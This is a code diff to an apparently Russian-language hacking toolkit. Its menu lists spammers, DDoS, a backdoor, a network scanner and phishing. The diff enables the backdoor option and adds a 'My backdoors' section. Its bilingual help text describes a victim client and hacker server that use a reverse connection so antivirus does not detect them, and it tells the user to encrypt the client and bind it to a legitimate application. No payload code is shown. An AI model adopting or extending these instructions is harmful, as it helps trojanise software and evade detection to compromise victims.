@@ -66,7 +66,7 @@ text ='''
         [1]-DSpamers
         [2]-D-ddos
         [3]-passgen
-	[4]-backdoor[Скоро]
+	[4]-backdoor
 	[5]-SkanNet
 	[6]-fishing[Скоро]
 	[7]-В плане
@@ -165,6 +165,7 @@ def DefSec4():
 	     [1]-backdoorV1
 	     [2]-backdoorV2
 	     [3]-Применение(application)
+	     [4]-Мои бэкдоры(My backdoors)
 	     
 	     [99]-Назад в главное меню(back to main menu)
 	     [0]-Выход(Exit)
@@ -310,7 +311,8 @@ my_backdoor.run() """)
 И так я написал простенький бэкдор состоит он из:
 1-Клиент для жертвы
 2-Сервер для хакера
-В папке USER-BD будут сохранены файлы backdoor
+В папке USER-BD будут сохранены файлы backdoor или,
+в разделе "Мои бэкдоры"
 Чтоб антивирусы не палили бэкдор,соединение произходит самой жертвой,
 то есть соединение будет происходить к серверу.
 НО прежде чем использовать Клиент надо зашифровать и склеить с приложением
@@ -322,7 +324,8 @@ P.s Учитывая какая ОС таким и команды нужно в�
 And so I wrote a simple backdoor it consists of:
 1-Client for the victim
 2-Server for the hacker
-Backdoor files will be saved in the USER-BD folder
+Backdoor files will be saved in the USER-BD folder or,
+in the "My backdoors" section
 So that antiviruses do not fire backdoor, the connection is made by the victim itself,
 that is, the connection will occur to the server.
 BUT before using the Client must be encrypted and glued with the application
